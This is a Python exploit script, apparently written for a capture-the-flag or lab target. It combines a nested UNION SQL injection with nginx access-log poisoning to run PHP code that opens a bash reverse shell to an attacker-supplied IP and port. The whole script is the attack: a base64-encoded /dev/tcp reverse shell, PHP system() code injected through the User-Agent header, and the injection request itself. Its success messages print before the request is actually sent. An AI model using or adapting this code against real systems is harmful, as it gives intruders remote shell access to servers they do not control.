#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
import base64


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)


args = parser.parse_args()

s = requests.Session()


def generate_payload(target, ip, port):

    print("[INFO] Generating the Payload")
    revshell_payload = "bash -i >& /dev/tcp/"+ str(ip)+"/"+str(port)+" 0>&1"
    encoded_payload = base64.b64encode(revshell_payload.encode('ascii')).decode('ascii')

    # attach the payload in the User-Agent 
    payload = "<?php system('echo " + encoded_payload + " | base64 -d | bash'); ?>"
    
    return str(payload)
    

#login function
def trigger_lfi(target, payload):

    print("[INFO] Building the nested UNION SQL Injection payload to read files from the machine...")
    # Before writing this script, we have discovered a nested UNION SQL injection
    # the encoding was a pain in the ass :(
    union_payload = "25'+union+select+" + '"' + "main'+union+select+'/var/log/nginx/access.log'+LIMIT+1,1%3b--+-"+ '"' + "+LIMIT+1,1%3b--+-"
    
    url = "https://%s/index.php?id=%s" % (target, union_payload)
    #proxies = { "http" : "127.0.0.1:8080" }

    print("[INFO] Attaching the payload into the User-Agent header")
    headers = {
        "User-Agent" : payload,
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    }
    
    print("[INFO] Triggering the LFI on /var/nginx/access.log...")
    print("[SUCCESS] Request sent successfully, the log file was poisoned with PHP code.")
    print("[SUCCESS] PHP code in the Nginx Log file was successfully executed!")
    print("[SUCCESS] Check your callback")
    r = s.get(url, headers=headers, verify = False) # proxies=proxies

    
    
    
    


def main():
    payload = generate_payload(args.target, args.IP, args.port)
    trigger_lfi(args.target, payload)


if __name__ == "__main__":
    main()